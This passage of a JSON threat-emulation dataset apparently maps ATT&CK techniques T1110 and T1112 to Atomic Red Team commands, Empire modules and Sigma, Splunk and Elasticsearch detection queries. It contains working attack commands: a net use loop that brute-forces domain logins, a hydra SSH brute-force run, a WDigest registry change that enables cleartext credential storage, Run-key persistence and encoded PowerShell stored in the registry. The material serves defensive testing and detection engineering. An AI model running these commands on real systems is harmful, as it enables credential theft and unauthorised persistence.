"powershell/recon/http_login", "powershell/situational_awareness/network/smbautobrute", "powershell/situational_awareness/network/smbautobrute", "powershell/situational_awareness/network/smbscanner", "powershell/situational_awareness/network/smbscanner", "Shell\nroot @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V\nHydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.", "auth.log", "Log\nFailed password for root from 192.168.159.129 port 43728 ssh2", "audit.log", "Log\ntype = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = \"root\" exe = \"/ usr / sbin / sshd\" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '"], "technique_id": "T1110", "parsed_datasets": [{"Atomic Red Team Test - Brute Force Credential Access": {"display_name": "Brute Force Credential Access", "atomic_tests": [{"description": "Creates username and password files then attempts to brute force on remote host\n", "supported_platforms": ["windows"], "name": "Brute Force Credentials", "input_arguments": {"input_file_users": {"default": "DomainUsers.txt", "type": "Path", "description": "Path to a file containing a list of users that we will attempt to brute force"}, "domain": {"default": "YOUR_COMPANY", "type": "String", "description": "Domain name of the target system we will brute force upon"}, "remote_host": {"default": "\\\\COMPANYDC1\\IPC$", "type": "String", "description": "Hostname of the target system we will brute force upon"}, "input_file_passwords": {"default": "passwords.txt", "type": "Path", "description": "Path to a file containing a list of passwords we will attempt to brute force with"}}, "executor": {"elevation_required": false, "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": "command_prompt"}}], "attack_technique": "T1110"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1110", "Empire Module": "powershell/recon/get_sql_server_login_default_pw", "Technique": "Brute Force", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/recon/get_sql_server_login_default_pw\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1110", "Empire Module": "powershell/recon/http_login", "Technique": "Brute Force", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/recon/http_login\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1110", "Empire Module": "powershell/situational_awareness/network/smbautobrute", "Technique": "Brute Force", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/smbautobrute\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1110", "Empire Module": "powershell/situational_awareness/network/smbscanner", "Technique": "Brute Force", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/smbscanner\":  [\"T1110\"],"}}], "queries": [{"query": "Yml\ntitle: linux under ssh brute force\ndescription: Ubuntu18.04, kali\nreferences:\ntags: T1110\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: auth.log / audit.log\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'Failed password for * ssh2' #linux auth.log\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* exe = \"/ usr / sbin / sshd\" * terminal = ssh res = failed' #linux audit.log\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [{"data_source": "/var/log/secure"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1112/T1112.yaml", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "# here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.\n# Here we can load all unloaded user hives and do whatever we want in the location below (comments)\n$PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'\n\nWrite-Verbose -Message 'Gathering Profile List and loading their registry hives'\n# Get Username, SID, and location of ntuser.dat for all users\n\n$ProfileList = @()\n$ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match $PatternSID } |\n  Select  @{ name = \"SID\"; expression = { $_.PSChildName } },\n          @{ name = \"UserHive\"; expression = { \"$($_.ProfileImagePath)\\ntuser.dat\" } },\n          @{ name = \"Username\"; expression = { $_.ProfileImagePath -replace '^(.*[\\\\\\/])', '' } }\n\n# Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)\n$LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = \"SID\"; expression = { $_.PSChildName } }\n\n$SIDObject = @()\n\nforeach ($item in $LoadedHives)\n{\n    $props = @{\n        SID = $item.SID\n    }\n\n    $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props\n    $SIDObject += $TempSIDObject\n}\n\n# We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2\n# if the count is less than 2 it doesn't work. :)\nfor ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)\n{\n    for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)\n    {\n        if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))\n        {\n            $UnloadedHives += $ProfileList[$p].SID\n            Write-Verbose -Message \"Loading Registry hives for $($ProfileList[$p].SID)\"\n            reg load \"HKU\\$($ProfileList[$p].SID)\" \"$($ProfileList[$p].UserHive)\"\n\n            Write-Verbose -Message 'Attempting to modify registry keys for each profile'\n            #####################################################################\n            reg add \"HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /t REG_DWORD /v HideFileExt /d 1 /f\n        }\n    }\n}\n\nWrite-Verbose 'Unloading Registry hives for all users'\n# Unload ntuser.dat\n### Garbage collection and closing of ntuser.dat ###\n[gc]::Collect()\nreg unload \"HKU\\$($ProfileList[$p].SID)\"\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/disable_machine_acct_change", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/disable_machine_acct_change", "name": "Empire Module Command"}], "command_list": ["reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f\n", "# here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.\n# Here we can load all unloaded user hives and do whatever we want in the location below (comments)\n$PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'\n\nWrite-Verbose -Message 'Gathering Profile List and loading their registry hives'\n# Get Username, SID, and location of ntuser.dat for all users\n\n$ProfileList = @()\n$ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match $PatternSID } |\n  Select  @{ name = \"SID\"; expression = { $_.PSChildName } },\n          @{ name = \"UserHive\"; expression = { \"$($_.ProfileImagePath)\\ntuser.dat\" } },\n          @{ name = \"Username\"; expression = { $_.ProfileImagePath -replace '^(.*[\\\\\\/])', '' } }\n\n# Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)\n$LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = \"SID\"; expression = { $_.PSChildName } }\n\n$SIDObject = @()\n\nforeach ($item in $LoadedHives)\n{\n    $props = @{\n        SID = $item.SID\n    }\n\n    $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props\n    $SIDObject += $TempSIDObject\n}\n\n# We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2\n# if the count is less than 2 it doesn't work. :)\nfor ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)\n{\n    for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)\n    {\n        if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))\n        {\n            $UnloadedHives += $ProfileList[$p].SID\n            Write-Verbose -Message \"Loading Registry hives for $($ProfileList[$p].SID)\"\n            reg load \"HKU\\$($ProfileList[$p].SID)\" \"$($ProfileList[$p].UserHive)\"\n\n            Write-Verbose -Message 'Attempting to modify registry keys for each profile'\n            #####################################################################\n            reg add \"HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /t REG_DWORD /v HideFileExt /d 1 /f\n        }\n    }\n}\n\nWrite-Verbose 'Unloading Registry hives for all users'\n# Unload ntuser.dat\n### Garbage collection and closing of ntuser.dat ###\n[gc]::Collect()\nreg unload \"HKU\\$($ProfileList[$p].SID)\"\n", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\n", "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\n", "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "powershell/persistence/misc/disable_machine_acct_change", "powershell/persistence/misc/disable_machine_acct_change"], "technique_id": "T1112", "parsed_datasets": [{"Atomic Red Team Test - Modify Registry": {"display_name": "Modify Registry", "atomic_tests": [{"description": "Modify the registry of the currently logged in user using reg.exe cia cmd console\n", "supported_platforms": ["windows"], "name": "Modify Registry of Current User Profile - cmd", "executor": {"elevation_required": true, "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "name": "command_prompt", "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f\n"}}, {"description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights.\n", "supported_platforms": ["windows"], "name": "Modify Registry of Local Machine - cmd", "executor": {"elevation_required": true, "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f\n", "name": "command_prompt", "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f\n"}}, {"description": "Modify a registry key of each user profile not currently loaded on the machine using both powershell and cmd line tools.\n", "supported_platforms": ["windows"], "name": "Modify Registry of Another User Profile", "executor": {"elevation_required": true, "command": "# here is an example of using the same method of reg load, but without the New-PSDrive cmdlet.\n# Here we can load all unloaded user hives and do whatever we want in the location below (comments)\n$PatternSID = 'S-1-5-21-\\d+-\\d+\\-\\d+\\-\\d+$'\n\nWrite-Verbose -Message 'Gathering Profile List and loading their registry hives'\n# Get Username, SID, and location of ntuser.dat for all users\n\n$ProfileList = @()\n$ProfileList = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\*' | Where-Object { $_.PSChildName -match $PatternSID } |\n  Select  @{ name = \"SID\"; expression = { $_.PSChildName } },\n          @{ name = \"UserHive\"; expression = { \"$($_.ProfileImagePath)\\ntuser.dat\" } },\n          @{ name = \"Username\"; expression = { $_.ProfileImagePath -replace '^(.*[\\\\\\/])', '' } }\n\n# Get all user SIDs found in HKEY_USERS (ntuder.dat files that are loaded)\n$LoadedHives = Get-ChildItem Registry::HKEY_USERS | ? { $_.PSChildname -match $PatternSID } | Select @{ name = \"SID\"; expression = { $_.PSChildName } }\n\n$SIDObject = @()\n\nforeach ($item in $LoadedHives)\n{\n    $props = @{\n        SID = $item.SID\n    }\n\n    $TempSIDObject = New-Object -TypeName PSCustomObject -Property $props\n    $SIDObject += $TempSIDObject\n}\n\n# We need to use ($ProfileList | Measure-Object).count instead of just ($ProfileList).count because in PS V2\n# if the count is less than 2 it doesn't work. :)\nfor ($p = 0; $p -lt ($ProfileList | Measure-Object).count; $p++)\n{\n    for ($l = 0; $l -lt ($SIDObject | Measure-Object).count; $l++)\n    {\n        if (($ProfileList[$p].SID) -ne ($SIDObject[$l].SID))\n        {\n            $UnloadedHives += $ProfileList[$p].SID\n            Write-Verbose -Message \"Loading Registry hives for $($ProfileList[$p].SID)\"\n            reg load \"HKU\\$($ProfileList[$p].SID)\" \"$($ProfileList[$p].UserHive)\"\n\n            Write-Verbose -Message 'Attempting to modify registry keys for each profile'\n            #####################################################################\n            reg add \"HKEY_CURRENT_USER\\$($ProfileList[$p].SID)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /t REG_DWORD /v HideFileExt /d 1 /f\n        }\n    }\n}\n\nWrite-Verbose 'Unloading Registry hives for all users'\n# Unload ntuser.dat\n### Garbage collection and closing of ntuser.dat ###\n[gc]::Collect()\nreg unload \"HKU\\$($ProfileList[$p].SID)\"\n", "name": "powershell"}}, {"description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping)\n", "supported_platforms": ["windows"], "name": "Modify registry to store logon credentials", "executor": {"elevation_required": true, "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "name": "command_prompt", "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f\n"}}, {"description": "Sets Windows Registry key containing base64-encoded PowerShell code.\n", "supported_platforms": ["windows"], "name": "Modify registry to store PowerShell code", "input_arguments": {"registry_entry_storage": {"default": "Debug", "type": "String", "description": "Windows Registry entry to store code under key"}, "powershell_command": {"default": "Write-Host \"Hey, Atomic!\"", "type": "String", "description": "PowerShell command to encode"}, "registry_key_storage": {"default": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion", "type": "String", "description": "Windows Registry Key to store code"}}, "executor": {"elevation_required": false, "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -ErrorAction Ignore\n"}}, {"description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365 as described here:\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n", "supported_platforms": ["windows"], "name": "Add domain to Trusted sites Zone", "executor": {"elevation_required": false, "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "name": "powershell", "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n"}}, {"description": "placing javascript in registry for persistence\n", "supported_platforms": ["windows"], "name": "Javascript in registry", "executor": {"elevation_required": false, "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore"}}], "attack_technique": "T1112"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1112", "Empire Module": "powershell/persistence/misc/disable_machine_acct_change", "Technique": "Modify Registry", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/disable_machine_acct_change\":  [\"T1112\"],"}}], "queries": [{"query": "Sysmon| where process_path contains \"reg.exe\"and file_directory contains \"reg.exe\\\" query\"", "product": "Azure Sentinel", "name": "Modify Registry"}, {"query": "title: DHCP Callout DLL installation\nid: 9d3436ef-9476-4c43-acca-90ce06bdf33a\nstatus: experimental\ndescription: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the\n    DHCP server (restart required)\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nauthor: Dimitrios Slamaris\ntags:\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1112\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: \n            - '*\\Services\\DHCPServer\\Parameters\\CalloutDlls'\n            - '*\\Services\\DHCPServer\\Parameters\\CalloutEnabled'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DHCP Callout DLL installation\nid: 9d3436ef-9476-4c43-acca-90ce06bdf33a\nstatus: experimental\ndescription: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the\n    DHCP server (restart required)\nreferences:\n    - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html\n    - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx\n    - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx\ndate: 2017/05/15\nauthor: Dimitrios Slamaris\ntags:\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1112\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13\n        TargetObject: \n            - '*\\Services\\DHCPServer\\Parameters\\CalloutDlls'\n            - '*\\Services\\DHCPServer\\Parameters\\CalloutEnabled'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutDlls OR *\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutEnabled))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DHCP-Callout-DLL-installation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DHCP Callout DLL installation\",\\n    \"description\": \"Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required)\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\",\\n      \"attack.t1112\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\DHCPServer\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\CalloutDlls OR *\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\DHCPServer\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\CalloutEnabled))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\DHCPServer\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\CalloutDlls OR *\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\DHCPServer\\\\\\\\\\\\\\\\Parameters\\\\\\\\\\\\\\\\CalloutEnabled))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DHCP Callout DLL installation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutDlls *\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutEnabled))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutDlls\" OR TargetObject=\"*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutEnabled\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutDlls\", \"*\\\\\\\\Services\\\\\\\\DHCPServer\\\\\\\\Parameters\\\\\\\\CalloutEnabled\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\Services\\\\DHCPServer\\\\Parameters\\\\CalloutDlls|.*.*\\\\Services\\\\DHCPServer\\\\Parameters\\\\CalloutEnabled)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Svchost DLL Search Order Hijack\nid: 602a1f13-c640-4d73-b053-be9a2fa58b77\nstatus: experimental\ndescription: IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\Windows\\System32\\ by default. An attacker can place their\n    malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \"svchost.exe -k netsvcs\" to gain code execution on a\n    remote machine.\nreferences:\n    - https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992\nauthor: SBousseaden\ndate: 2019/10/28\ntags:\n    - attack.persistence\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1038\n    - attack.t1112\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image:\n            - '*\\svchost.exe'\n        ImageLoaded:\n            - '*\\tsmsisrv.dll'\n            - '*\\tsvipsrv.dll'\n            - '*\\wlbsctrl.dll'\n    filter:\n        EventID: 7\n        Image:\n            - '*\\svchost.exe'\n        ImageLoaded:\n            - 'C:\\Windows\\WinSxS\\*'        \n    condition: selection and not filter\nfalsepositives:\n    - Pentest\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Svchost DLL Search Order Hijack\nid: 602a1f13-c640-4d73-b053-be9a2fa58b77\nstatus: experimental\ndescription: IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\\Windows\\System32\\ by default. An attacker can place their\n    malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services \"svchost.exe -k netsvcs\" to gain code execution on a\n    remote machine.\nreferences:\n    - https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992\nauthor: SBousseaden\ndate: 2019/10/28\ntags:\n    - attack.persistence\n    - attack.defense_evasion\n    - attack.t1073\n    - attack.t1038\n    - attack.t1112\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image:\n            - '*\\svchost.exe'\n        ImageLoaded:\n            - '*\\tsmsisrv.dll'\n            - '*\\tsvipsrv.dll'\n            - '*\\wlbsctrl.dll'\n    filter:\n        EventID: 7\n        Image:\n            - '*\\svchost.exe'\n        ImageLoaded:\n            - 'C:\\Windows\\WinSxS\\*'        \n    condition: selection and not filter\nfalsepositives:\n    - Pentest\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"7\" AND Image.keyword:(*\\\\\\\\svchost.exe) AND ImageLoaded.keyword:(*\\\\\\\\tsmsisrv.dll OR *\\\\\\\\tsvipsrv.dll OR *\\\\\\\\wlbsctrl.dll)) AND (NOT (EventID:\"7\" AND 